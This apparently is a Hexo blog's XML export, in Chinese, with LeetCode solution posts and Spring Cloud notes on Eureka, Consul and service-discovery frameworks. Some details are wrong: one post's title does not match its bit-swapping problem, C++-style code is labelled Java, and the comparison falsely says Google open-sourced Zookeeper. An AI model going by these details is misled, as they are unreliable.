    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给出一个函数  f(x, y) 和一个目标结果 z，请你计算方程 f(x,y) == z 所有可能的正整数 数对 x 和 y。</p>
<p>给定函数是严格单调的，也就是说：</p>
<ul>
<li><code>f(x, y) &lt; f(x + 1, y)</code></li>
<li><code>f(x, y) &lt; f(x, y + 1)</code></li>
</ul>
<p>函数接口定义如下：</p>
<pre><code>interface CustomFunction {
public:
  // Returns positive integer f(x, y) for any given positive integer x and y.
  int f(int x, int y);
};</code></pre><p>如果你想自定义测试，你可以输入整数 function_id 和一个目标结果 z 作为输入，其中 function_id 表示一个隐藏函数列表中的一个函数编号，题目只会告诉你列表中的 2 个函数。  </p>
<p>你可以将满足条件的 结果数对 按任意顺序返回。</p>
<h3 id="示例-1"><a href="#示例-1" class="headerlink" title="示例 1:"></a>示例 1:</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：function_id &#x3D; 1, z &#x3D; 5</span><br><span class="line">输出：[[1,4],[2,3],[3,2],[4,1]]</span><br><span class="line">解释：function_id &#x3D; 1 表示 f(x, y) &#x3D; x + y</span><br></pre></td></tr></table></figure>

<h2 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：function_id &#x3D; 2, z &#x3D; 5</span><br><span class="line">输出：[[1,5],[5,1]]</span><br><span class="line">解释：function_id &#x3D; 2 表示 f(x, y) &#x3D; x * y</span><br></pre></td></tr></table></figure>

<h2 id="提示："><a href="#提示：" class="headerlink" title="提示："></a>提示：</h2><ul>
<li>1 &lt;= function_id &lt;= 9</li>
<li>1 &lt;= z &lt;= 100</li>
<li>题目保证 f(x, y) == z 的解处于 1 &lt;= x, y &lt;= 1000 的范围内。</li>
<li>在 1 &lt;= x, y &lt;= 1000 的前提下，题目保证 f(x, y) 是一个 32 位有符号整数。</li>
</ul>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>暴力</p>
<h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; findSolution(CustomFunction customfunction, <span class="keyword">int</span> z) &#123;</span><br><span class="line">        List&lt;List&lt;Integer&gt;&gt; result = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>;i &lt;= z;i++) &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>;j &lt;= z;j++) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (customfunction.f(i, j) == z) &#123;</span><br><span class="line">                        List&lt;Integer&gt; temp = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">                        temp.add(i);</span><br><span class="line">                        temp.add(j);</span><br><span class="line">                        result.add(temp);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法二："><a href="#解法二：" class="headerlink" title="解法二："></a>解法二：</h3><p>二分查找因为函数是严格单调递增的，所以，可以使用二分查找</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; findSolution(CustomFunction customfunction, <span class="keyword">int</span> z) &#123;</span><br><span class="line">        List&lt;List&lt;Integer&gt;&gt; resultList = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1000</span>, tmp = <span class="number">1</span>; j &gt; <span class="number">0</span>; j--) &#123;</span><br><span class="line">            <span class="keyword">int</span> left = tmp, right = <span class="number">1000</span>, mid;</span><br><span class="line">            <span class="keyword">while</span> (left &lt;= right) &#123;</span><br><span class="line">                mid = left + (right - left &gt;&gt; <span class="number">1</span>);</span><br><span class="line">                <span class="keyword">int</span> myZ = customfunction.f(mid, j);</span><br><span class="line">                <span class="keyword">if</span> (myZ &gt; z)</span><br><span class="line">                    right = mid - <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> (myZ &lt; z)</span><br><span class="line">                    left = mid + <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                    List&lt;Integer&gt; paramList = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">                    paramList.add(mid);</span><br><span class="line">                    paramList.add(j);</span><br><span class="line">                    resultList.add(paramList);</span><br><span class="line">                    tmp = mid + <span class="number">1</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> resultList;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法三："><a href="#解法三：" class="headerlink" title="解法三："></a>解法三：</h3><p>双指针</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; findSolution(CustomFunction customfunction, <span class="keyword">int</span> z) &#123;</span><br><span class="line">        </span><br><span class="line">        List&lt;List&lt;Integer&gt;&gt; res = <span class="keyword">new</span> LinkedList&lt;&gt;();</span><br><span class="line">        <span class="keyword">int</span> start = <span class="number">1</span>, end = <span class="number">1000</span>;</span><br><span class="line">        <span class="keyword">while</span> (start &lt;= <span class="number">1000</span> &amp;&amp; end &gt;= <span class="number">1</span>) &#123;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">int</span> r = customfunction.f(start, end);</span><br><span class="line">            <span class="keyword">if</span> (r == z) &#123;</span><br><span class="line">                </span><br><span class="line">                List&lt;Integer&gt; tmp = <span class="keyword">new</span> LinkedList&lt;&gt;();</span><br><span class="line">                tmp.add(start);</span><br><span class="line">                tmp.add(end);</span><br><span class="line">                res.add(tmp);</span><br><span class="line">                start++;</span><br><span class="line">                end--;</span><br><span class="line">                </span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (r &gt; z)</span><br><span class="line">                end--;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                start++;   </span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Math</tag>
        <tag>二分查找</tag>
      </tags>
  </entry>
  <entry>
    <title>1394. 找出数组中的幸运数</title>
    <url>/2020/04/16/LeetCode/leetcode-001394.%20%E6%89%BE%E5%87%BA%E6%95%B0%E7%BB%84%E4%B8%AD%E7%9A%84%E5%B9%B8%E8%BF%90%E6%95%B0/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>在整数数组中，如果一个整数的出现频次和它的数值大小相等，我们就称这个整数为「幸运数」。</p>
<p>给你一个整数数组 arr，请你从中找出并返回一个幸运数。</p>
<ul>
<li>如果数组中存在多个幸运数，只需返回 <strong>最大</strong> 的那个。</li>
<li>如果数组中不含幸运数，则返回 <strong>-1</strong> 。</li>
</ul>
<h3 id="示例-1"><a href="#示例-1" class="headerlink" title="示例 1:"></a>示例 1:</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：arr &#x3D; [2,2,3,4]</span><br><span class="line">输出：2</span><br><span class="line">解释：数组中唯一的幸运数是 2 ，因为数值 2 的出现频次也是 2 。</span><br></pre></td></tr></table></figure>

<h2 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：arr &#x3D; [1,2,2,3,3,3]</span><br><span class="line">输出：3</span><br><span class="line">解释：1、2 以及 3 都是幸运数，只需要返回其中最大的 3 。</span><br></pre></td></tr></table></figure>

<h2 id="示例3："><a href="#示例3：" class="headerlink" title="示例3："></a>示例3：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：arr &#x3D; [2,2,2,3,3]</span><br><span class="line">输出：-1</span><br><span class="line">解释：数组中不存在幸运数。</span><br></pre></td></tr></table></figure>

<h2 id="示例4："><a href="#示例4：" class="headerlink" title="示例4："></a>示例4：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：arr &#x3D; [5]</span><br><span class="line">输出：-1</span><br></pre></td></tr></table></figure>

<h2 id="示例5："><a href="#示例5：" class="headerlink" title="示例5："></a>示例5：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：arr &#x3D; [7,7,7,7,7,7,7]</span><br><span class="line">输出：7</span><br></pre></td></tr></table></figure>

<h2 id="提示："><a href="#提示：" class="headerlink" title="提示："></a>提示：</h2><ul>
<li><code>1 &lt;= arr.length &lt;= 500</code></li>
<li><code>1 &lt;= arr[i] &lt;= 500</code></li>
</ul>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>借助HashMap</p>
<p>key存值，value存值出现的次数</p>
<p>然后遍历，找到key == value的数，取最大的即可</p>
<h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">findLucky</span><span class="params">(<span class="keyword">int</span>[] arr)</span> </span>&#123;</span><br><span class="line">		Map&lt;Integer, Integer&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> a : arr) &#123;</span><br><span class="line">			<span class="keyword">if</span> (map.containsKey(a)) &#123;</span><br><span class="line">				map.replace(a, map.get(a) + <span class="number">1</span>);</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				map.put(a, <span class="number">1</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">int</span> max = -<span class="number">1</span>;</span><br><span class="line">		<span class="keyword">for</span> (Map.Entry&lt;Integer, Integer&gt; entry : map.entrySet()) &#123;</span><br><span class="line">			<span class="keyword">if</span> (entry.getKey() == entry.getValue()) &#123;</span><br><span class="line">				max = max &gt; entry.getKey() ? max : entry.getKey();</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">return</span> max;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Arrays</tag>
        <tag>Math</tag>
      </tags>
  </entry>
  <entry>
    <title>1407. Top Travellers</title>
    <url>/2020/04/16/LeetCode/leetcode-001407.%20Top%20Travellers/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>Table: <code>Users</code></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">+<span class="comment">---------------+---------+</span></span><br><span class="line">| Column Name   | Type    |</span><br><span class="line">+<span class="comment">---------------+---------+</span></span><br><span class="line">| id            | int     |</span><br><span class="line">| name          | varchar |</span><br><span class="line">+<span class="comment">---------------+---------+</span></span><br><span class="line">id is the primary key for this table.</span><br><span class="line">name is the name of the user</span><br></pre></td></tr></table></figure>

<p>Table: <code>Rides</code></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">+<span class="comment">---------------+---------+</span></span><br><span class="line">| Column Name   | Type    |</span><br><span class="line">+<span class="comment">---------------+---------+</span></span><br><span class="line">| id            | int     |</span><br><span class="line">| user_id       | int     |</span><br><span class="line">| distance      | int     |</span><br><span class="line">+<span class="comment">---------------+---------+</span></span><br><span class="line">id is the primary key for this table.</span><br></pre></td></tr></table></figure>

<p>Write an SQL query to report the distance travelled by each user.</p>
<p>Return the result table ordered by travelled_distance in descending order, if two or more users travelled the same distance, order them by their name in ascending order.</p>
<p>The query result format is in the following example.</p>
<h3 id="Example-1"><a href="#Example-1" class="headerlink" title="Example 1:"></a>Example 1:</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Users table:</span><br><span class="line">+------+-----------+</span><br><span class="line">| id   | name      |</span><br><span class="line">+------+-----------+</span><br><span class="line">| 1    | Alice     |</span><br><span class="line">| 2    | Bob       |</span><br><span class="line">| 3    | Alex      |</span><br><span class="line">| 4    | Donald    |</span><br><span class="line">| 7    | Lee       |</span><br><span class="line">| 13   | Jonathan  |</span><br><span class="line">| 19   | Elvis     |</span><br><span class="line">+------+-----------+</span><br><span class="line"></span><br><span class="line">Rides table:</span><br><span class="line">+------+----------+----------+</span><br><span class="line">| id   | user_id  | distance |</span><br><span class="line">+------+----------+----------+</span><br><span class="line">| 1    | 1        | 120      |</span><br><span class="line">| 2    | 2        | 317      |</span><br><span class="line">| 3    | 3        | 222      |</span><br><span class="line">| 4    | 7        | 100      |</span><br><span class="line">| 5    | 13       | 312      |</span><br><span class="line">| 6    | 19       | 50       |</span><br><span class="line">| 7    | 7        | 120      |</span><br><span class="line">| 8    | 19       | 400      |</span><br><span class="line">| 9    | 7        | 230      |</span><br><span class="line">+------+----------+----------+</span><br><span class="line"></span><br><span class="line">Result table:</span><br><span class="line">+----------+--------------------+</span><br><span class="line">| name     | travelled_distance |</span><br><span class="line">+----------+--------------------+</span><br><span class="line">| Elvis    | 450                |</span><br><span class="line">| Lee      | 450                |</span><br><span class="line">| Bob      | 317                |</span><br><span class="line">| Jonathan | 312                |</span><br><span class="line">| Alex     | 222                |</span><br><span class="line">| Alice    | 120                |</span><br><span class="line">| Donald   | 0                  |</span><br><span class="line">+----------+--------------------+</span><br><span class="line">Elvis and Lee travelled 450 miles, Elvis is the top traveller as his name is alphabetically smaller than Lee.</span><br><span class="line">Bob, Jonathan, Alex and Alice have only one ride and we just order them by the total distances of the ride.</span><br><span class="line">Donald didn&#39;t have any rides, the distance travelled by him is 0.</span><br></pre></td></tr></table></figure>

<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><h4 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"># Write your MySQL query statement below</span><br><span class="line">select u.name, ifnull(sum(r.distance),<span class="number">0</span>) travelled_distance from users u left join rides r on u.id=r.user_id group by user_id order by travelled_distance desc,u.name asc</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>SQL</tag>
        <tag>leetcode</tag>
      </tags>
  </entry>
  <entry>
    <title>1217. 玩筹码</title>
    <url>/2020/04/16/LeetCode/leetcode-%E9%9D%A2%E8%AF%95%E9%A2%98-05.07.%20%E9%85%8D%E5%AF%B9%E4%BA%A4%E6%8D%A2/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>配对交换。编写程序，交换某个整数的奇数位和偶数位，尽量使用较少的指令（也就是说，位0与位1交换，位2与位3交换，以此类推）。</p>
<h3 id="示例-1"><a href="#示例-1" class="headerlink" title="示例 1:"></a>示例 1:</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：num &#x3D; 2（或者0b10）</span><br><span class="line">输出 1 (或者 0b01)</span><br></pre></td></tr></table></figure>

<h2 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：num &#x3D; 3</span><br><span class="line"> 输出：3</span><br></pre></td></tr></table></figure>

<h2 id="提示："><a href="#提示：" class="headerlink" title="提示："></a>提示：</h2><ul>
<li><code>num</code>的范围在[0, 2^30 - 1]之间，不会发生整数溢出。</li>
</ul>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>奇数位右移，偶数位左移，取或得结果。</p>
<p>0xaaaaaaaa = 10101010101010101010101010101010 (偶数位为1，奇数位为0）</p>
<p>0x55555555 = 1010101010101010101010101010101 (偶数位为0，奇数位为1）</p>
<h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">exchangeBits</span><span class="params">(<span class="keyword">int</span> num)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ((num &amp; <span class="number">0x55555555</span>) &lt;&lt; <span class="number">1</span>) | ((num &amp; <span class="number">0xaaaaaaaa</span>) &gt;&gt; <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="解法二："><a href="#解法二：" class="headerlink" title="解法二："></a>解法二：</h3><p>转成二进制字符串，交换位置，再转换成整数。</p>
<p>注意，如果长度不是2的倍数，需要添加前导0.</p>
]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Math</tag>
      </tags>
  </entry>
  <entry>
    <title>RAFT协议介绍</title>
    <url>/2020/04/14/SpringCloud/2020-04-14-003-RAFT%E5%8D%8F%E8%AE%AE%E4%BB%8B%E7%BB%8D/</url>
    <content><![CDATA[<h1 id="RAFT协议介绍"><a href="#RAFT协议介绍" class="headerlink" title="RAFT协议介绍"></a>RAFT协议介绍</h1><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="http://thesecretlivesofdata.com/raft/" target="_blank" rel="noopener">RAFT协议动图演示</a></p>
]]></content>
      <categories>
        <category>Spring Cloud</category>
      </categories>
      <tags>
        <tag>Spring Cloud</tag>
        <tag>RAFT</tag>
      </tags>
  </entry>
  <entry>
    <title>Consul介绍</title>
    <url>/2020/04/14/SpringCloud/2020-04-14-002-Consul%E4%BB%8B%E7%BB%8D/</url>
    <content><![CDATA[<h1 id="Consul介绍"><a href="#Consul介绍" class="headerlink" title="Consul介绍"></a>Consul介绍</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Consul是HashiCorp公司推出的开源工具，用于实现分布式系统的服务发现与配置。Consul是分布式的、高可用的、 可横向扩展的。它具备以下特性:</p>
<ul>
<li>服务发现: Consul提供了通过DNS或者HTTP接口的方式来注册服务和发现服务。一些外部的服务通过Consul很容易的找到它所依赖的服务。</li>
<li>健康检测: Consul的Client提供了健康检查的机制，可以通过用来避免流量被转发到有故障的服务上。</li>
<li>Key/Value存储: 应用程序可以根据自己的需要使用Consul提供的Key/Value存储。 Consul提供了简单易用的HTTP接口，结合其他工具可以实现动态配置、功能标记、领袖选举等等功能。</li>
<li>多数据中心: Consul支持开箱即用的多数据中心. 这意味着用户不需要担心需要建立额外的抽象层让业务扩展到多个区域。</li>
</ul>
<h2 id="Consul的架构"><a href="#Consul的架构" class="headerlink" title="Consul的架构"></a>Consul的架构</h2><p><img src="https://huhansi.github.io/images/2020-04-14-consul1.png" alt="Consul架构"></p>
<ul>
<li>Consul Cluster由部署和运行了Consul Agent的节点组成。在Cluster中有两种角色:Server和 Client。</li>
<li>Server和Client的角色和Consul Cluster上运行的应用服务无关, 是基于Consul层面的一种角色划分.</li>
<li>Consul Server: 用于维护Consul Cluster的状态信息。 官方建议是: 至少要运行3个或者3个以上的Consul Server。 多个server之中需要选举一个leader, 这个选举过程Consul基于Raft协议实现. 多个Server节点上的Consul数据信息保持强一致性。在局域网内与本地客户端通讯，通过广域网与其他数据中心通讯。</li>
<li>Consul Client: 只维护自身的状态, 并将HTTP和DNS接口请求转发给服务端。</li>
</ul>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://www.hi-linux.com/posts/6132.html" target="_blank" rel="noopener">Consul 入门</a></p>
]]></content>
      <categories>
        <category>Spring Cloud</category>
      </categories>
      <tags>
        <tag>Spring Cloud</tag>
        <tag>服务发现</tag>
        <tag>服务治理</tag>
        <tag>Consul</tag>
      </tags>
  </entry>
  <entry>
    <title>Eureka介绍</title>
    <url>/2020/04/14/SpringCloud/2020-04-14-001-eukera%E4%BB%8B%E7%BB%8D/</url>
    <content><![CDATA[<h1 id="Eureka介绍"><a href="#Eureka介绍" class="headerlink" title="Eureka介绍"></a>Eureka介绍</h1><h2 id="产生的背景"><a href="#产生的背景" class="headerlink" title="产生的背景"></a>产生的背景</h2><p>一般我们自己的服务之间互相调用的时候，直接就在配置文件中配置被调用的服务地址。然后服务读取配置文件，发起调用。调用关系可以简化为下图：</p>
<p><img src="https://huhansi.github.io/images/2020-04-14-eureka1.png" alt="服务直接调用"></p>
<p>这样的调用会存在一些不小的问题：</p>
<ol>
<li>服务B如果挂了的话，服务A即时调用不同</li>
<li>如果后续再新增了N多服务器的话，服务A每个服务都要维护一个调用地址，繁琐，容易出错</li>
<li>如果服务B是一个基础服务，有成百上千个服务调用它的话，每个服务都要维护一个服务B的地址。一旦服务B地址有所变更，那么每个服务都要修改</li>
</ol>
<p>于是，服务中心就应运而生了。服务中心又称为注册中心，管理各种服务功能，包括服务的注册，发现，熔断负载，降级等。</p>
<p>有了服务中心之后，上图服务A调用服务B的流程，就转变为：</p>
<p><img src="https://huhansi.github.io/images/2020-04-14-eureka2.png" alt="通过服务中心调用"></p>
<ol>
<li>服务A向服务中心请求，获取服务B的地址列表（前提是服务B在启动之后已经向服务中心注册过，否则获取到的结果为空列表）</li>
<li>服务中心将服务B的地址列表返回给服务A</li>
<li>服务A从地址列表中取出服务B的地址，发起调用请求</li>
</ol>
<h2 id="Eureka介绍-1"><a href="#Eureka介绍-1" class="headerlink" title="Eureka介绍"></a>Eureka介绍</h2><p>我们本文要介绍的Eureka大致的应用场景如下图：</p>
<p>Eureka 是一个服务发现工具。该体系结构主要是客户端/服务器，每个数据中心有一组 Eureka 服务器，通常每个可用区域一个。通常 Eureka 的客户使用嵌入式 SDK 来注册和发现服务。对于非本地集成的客户，使用功能区边框等透过 Eureka 透明地发现服务。</p>
<p>Eureka 提供了一个弱一致的服务视图，使用尽力而为复制。当客户端向服务器注册时，该服务器将尝试复制到其他服务器，但不提供保证。服务注册的生存时间（TTL）较短，要求客户端对服务器定时心跳。</p>
<h2 id="Eureka实例"><a href="#Eureka实例" class="headerlink" title="Eureka实例"></a>Eureka实例</h2><p>创建Eureka相关项目可参考附录</p>
<h3 id="创建一个Eureka-Server"><a href="#创建一个Eureka-Server" class="headerlink" title="创建一个Eureka Server"></a>创建一个Eureka Server</h3><h2 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h2><h3 id="创建Eureka相关项目"><a href="#创建Eureka相关项目" class="headerlink" title="创建Eureka相关项目"></a>创建Eureka相关项目</h3><p>借助Idea的Spring Assistant插件可以轻松的创建出Spring Cloud对应的项目</p>
<h4 id="安装Spring-Assistant"><a href="#安装Spring-Assistant" class="headerlink" title="安装Spring Assistant"></a>安装Spring Assistant</h4><p>如果IDEA上已经安装了此插件，可以跳过这个小章节，直接进去创建项目阶段。</p>
<p>点击菜单栏“File”-&gt;”Settings”-&gt;”plugin”，在搜索栏输入Spring，选择第一个Spring Assistant，然后重启IDEA即可。</p>
<p><img src="https://huhansi.github.io/images/2020-04-14-eureka4.png" alt="IDEA安装SpringAssistant"></p>
<h4 id="新建Eureka项目"><a href="#新建Eureka项目" class="headerlink" title="新建Eureka项目"></a>新建Eureka项目</h4><p>右键，选择new Project，选择Spring Assistant</p>
<p><img src="https://huhansi.github.io/images/2020-04-14-eureka5.png" alt="新建项目"></p>
<p>点击下一步，填写项目信息</p>
<p><img src="https://huhansi.github.io/images/2020-04-14-eureka6.png" alt="填写项目信息"></p>
<p>点击下一步，选择 Spring Cloud Discovery，再在右边选择Eureka Server</p>
<p><img src="https://huhansi.github.io/images/2020-04-14-eureka7.png" alt="选择Eureka Server"></p>
<p>一直下一步到最后即可。</p>
]]></content>
      <categories>
        <category>Spring Cloud</category>
      </categories>
      <tags>
        <tag>Spring Cloud</tag>
        <tag>服务发现</tag>
        <tag>服务治理</tag>
        <tag>Eureka</tag>
      </tags>
  </entry>
  <entry>
    <title>各种服务发现框架对比</title>
    <url>/2020/04/14/SpringCloud/2020-04-14-004-%E5%90%84%E7%A7%8D%E6%9C%8D%E5%8A%A1%E5%8F%91%E7%8E%B0%E6%A1%86%E6%9E%B6%E5%AF%B9%E6%AF%94/</url>
    <content><![CDATA[<h1 id="各种服务发现框架对比"><a href="#各种服务发现框架对比" class="headerlink" title="各种服务发现框架对比"></a>各种服务发现框架对比</h1><p>当前比较流程且常用的框架大体上有4个。Consul、Eureka、Zookeeper和Etcd。它们都解决了服务注册和服务发现问题。其中Eureka满足CAP中的AP，Consul、Etcd和Zookeeper满足了CAP中的CP。</p>
<h2 id="Eureka"><a href="#Eureka" class="headerlink" title="Eureka"></a>Eureka</h2><p>Eureka是在Java语言上，基于Restful Api开发的服务注册与发现组件，由Netflix开源。遗憾的是，目前Eureka仅开源到1.X版本，2.X版本已经宣布闭源。</p>
<p>Eureka采用的是Server/Client模式进行设计的。Server扮演了服务注册中心的角色，为Client提供服务注册和发现的功能，维护着注册到自身的Client的相关信息，同时提供接口给Client获取到注册表中其他服务的信息。Client将有关自己的服务的信息通过一定的方式登记到Server上，并在正常范围内维护自己信息的一致性，方便其他服务发现自己，同时可以通过Server获取到自己的依赖的其他服务信息，从而完成服务调用。</p>
<p>它的架构如下图所示：</p>
<p><img src="https://huhansi.github.io/images/2020-04-14-eureka8.png" alt="Eureka的架构"></p>
<p>其中：</p>
<ul>
<li>Application Services：作为Eureka Client，扮演了服务的提供者，提供业务服务，向Eureka Server注册和更新自己的信息，同时能从Eureka Server的注册表中获取到其他服务的信息。</li>
<li>Eureka Server：扮演服务注册中心的角色，提供服务注册和发现的功能，每个Eureka Cient向Eureka Server注册自己的信息，也可以通过Eureka Server获取到其他服务的信息达到发现和调用其他服务的目的。</li>
<li>Application Client：作为Eureka Client，扮演了服务消费者，通过Eureka Server获取到注册到上面的其他服务的信息，从而根据信息找到所需的服务发起远程调用。</li>
<li>Replicate： Eureka Server中的注册表信息的同步拷贝，保持不同的Eureka Server集群中的注册表中的服务实例信息的一致性。提供了数据的最终一致性。</li>
<li>Make Remote Call： 服务之间的远程调用。</li>
<li>Register： 注册服务实例，Client端向Server端注册自身的元数据以进行服务发现。</li>
<li>Renew：续约，通过发送心跳到Server维持和更新注册表中的服务实例元数据的有效性。当在一定时长内Server没有收到Client的心跳信息，将默认服务下线，将服务实例的信息从注册表中删除。</li>
<li>Cancel：服务下线，Client在关闭时主动向Server注销服务实例元数据，这时Client的的服务实例数据将从Server的注册表中删除。</li>
</ul>
<p>Eureka中没有使用任何的数据强一致性算法保证不同集群间的Server的数据一致，仅通过数据拷贝的方式争取注册中心数据的最终一致性，虽然放弃数据强一致性但是换来了Server的可用性，降低了注册的代价，提高了集群运行的健壮性。</p>
<h2 id="Consul"><a href="#Consul" class="headerlink" title="Consul"></a>Consul</h2><p>Consul是由HashiCorp基于Go语言开发的支持多数据中心分布式高可用的服务发布和注册服务软件，采用Raft算法保证服务的一致性，且支持健康检查。</p>
<p>Consul采用主从模式的设计，使得集群的数量可以大规模扩展，集群间通过RPC的方式调用(HTTP和DNS)。</p>
<p>它的结构如下图所示：</p>
<p><img src="https://huhansi.github.io/images/2020-04-14-consul4.png" alt="Consul的架构"></p>
<p>其中：</p>
<ul>
<li>Client：作为一个代理(非微服务实例)，它将转发所有的RPC请求到Server中。作为相对无状态的服务，它不持有任何注册信息。</li>
<li>Server：作为一个具备扩展功能的代理，它将响应RPC查询、参与Raft选举、维护集群状态和转发查询给Leader等。</li>
<li>Leader-Server：一个数据中心的所有Server都作为Raft节点集合的一部分。其中Leader将负责所有的查询和事务(如服务注册)，同时这些事务也会被复制到所有其他的节点。</li>
<li>Data Center：数据中心作为一个私有的，低延迟和高带宽的一个网络环境。每个数据中心会存在Consul集群，一般建议Server是3-5台(考虑到Raft算法在可用性和性能上取舍)，而Leader只能唯一，Client的数量没有限制，可以轻松扩展。</li>
</ul>
<h2 id="Zookeeper"><a href="#Zookeeper" class="headerlink" title="Zookeeper"></a>Zookeeper</h2><p>Zookeeper是由Google开源的在Java语言上实现的分布式协调服务，是Hadoop和Hbase的重要组件，提供了数据/发布订阅、负载均衡、分布式同步等功能。Zookeeper也是基于主从架构，搭建了一个可高扩展的服务集群。</p>
<p>它的结构如下图所示：</p>
<p><img src="https://huhansi.github.io/images/2020-04-14-zookeeper1.png" alt="Zookeeper的架构"></p>
<p>其中：</p>
<ul>
<li>Leader-Server：Leader负责进行投票的发起和决议，更新系统中的数据状态</li>
<li>Server：Server中存在两种类型：Follower和Observer。其中Follower接受客户端的请求并返回结果(事务请求将转发给Leader处理)，并在选举过程中参与投票；Observer与Follower功能一致，但是不参与投票过程，它的存在是为了提高系统的读取速度</li>
